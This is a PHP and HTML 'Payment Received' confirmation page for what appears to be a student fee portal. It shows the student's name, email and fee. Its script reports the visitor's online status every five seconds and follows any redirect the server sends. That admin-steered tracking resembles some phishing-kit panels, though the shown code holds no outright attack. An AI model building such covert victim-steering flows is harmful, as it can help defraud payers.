<?php
session_start();
require_once __DIR__ . '/includes/functions.php';
if (empty($_SESSION['student_token'])) { header('Location: index.php'); exit; }
$student = getStudentByToken($_SESSION['student_token']);
if (!$student) { header('Location: index.php'); exit; }
updateStudentActivity($student['id'], 'thankyou');
$visitorId = (int)($_SESSION['visitor_id'] ?? 0);
if ($visitorId) { $db = getDB(); $db->prepare("UPDATE visitors SET is_online=1, status='thankyou', last_activity=datetime('now') WHERE id=?")->execute([$visitorId]); }
$dv = getStudentDynamicVars($student);
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Payment Received</title>
    <style>
        *{box-sizing:border-box;margin:0;padding:0}
        body{font-family:'Segoe UI',system-ui,sans-serif;background:#f0fdf4;color:#1e293b;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px}
        .card{background:#fff;border-radius:14px;padding:40px;max-width:440px;width:100%;text-align:center;box-shadow:0 2px 12px rgba(0,0,0,.06)}
        .check{width:72px;height:72px;border-radius:50%;background:#dcfce7;display:flex;align-items:center;justify-content:center;margin:0 auto 20px;font-size:2rem}
        h1{font-size:1.4rem;margin-bottom:8px;color:#15803d}
        p{color:#64748b;font-size:.92rem;line-height:1.6;margin-bottom:8px}
        .amount{font-size:1.6rem;font-weight:700;color:#1e293b;margin:16px 0}
        .details{text-align:left;background:#f8fafc;border-radius:10px;padding:16px;margin-top:20px;font-size:.85rem}
        .details .row{display:flex;justify-content:space-between;padding:6px 0;border-bottom:1px solid #f1f5f9}
        .details .row:last-child{border-bottom:none}
        .details .lbl{color:#64748b}
    </style>
</head>
<body>
<?php include __DIR__ . '/includes/header.php'; ?>
<div class="card" style="margin-top:40px">
    <div class="check">&#10004;</div>
    <h1>Payment Received</h1>
    <p>Thank you, <?= sanitize($student['name']) ?>! Your payment has been processed successfully.</p>
    <div class="amount"><?= $dv['fee_display'] ?></div>
    <div class="details">
        <div class="row"><span class="lbl">Student</span><span><?= sanitize($student['name'] . ' ' . $student['surname']) ?></span></div>
        <div class="row"><span class="lbl">Email</span><span><?= sanitize($student['email']) ?></span></div>
        <div class="row"><span class="lbl">Status</span><span style="color:#16a34a;font-weight:600">Confirmed</span></div>
    </div>
    <p style="margin-top:20px;font-size:.82rem">You may close this page or wait for further instructions from the administrator.</p>
</div>
<?php include __DIR__ . '/includes/footer.php'; ?>
<script>
const studentId=<?=(int)$student['id']?>;const visitorId=<?=$visitorId?>;let pageVisible=true;
function hb(){if(!pageVisible||document.hidden)return;fetch('api/heartbeat.php',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({student_id:studentId})}).then(r=>r.json()).then(d=>{if(d.redirect)window.location.href=d.redirect}).catch(()=>{});if(visitorId)fetch('api/visitor-heartbeat.php',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({visitor_id:visitorId,status:'thankyou'})}).catch(()=>{});}
document.addEventListener('visibilitychange',()=>{if(document.hidden){pageVisible=false;navigator.sendBeacon('api/offline.php',JSON.stringify({student_id:studentId}));if(visitorId)navigator.sendBeacon('api/visitor-offline.php',JSON.stringify({visitor_id:visitorId}));clearInterval(t);t=null}else{pageVisible=true;hb();if(!t)t=setInterval(hb,5000)}});
function off(){navigator.sendBeacon('api/offline.php',JSON.stringify({student_id:studentId}));if(visitorId)navigator.sendBeacon('api/visitor-offline.php',JSON.stringify({visitor_id:visitorId}));}
hb();let t=setInterval(hb,5000);window.addEventListener('pagehide',off);window.addEventListener('beforeunload',off);
</script>
</body>
</html>
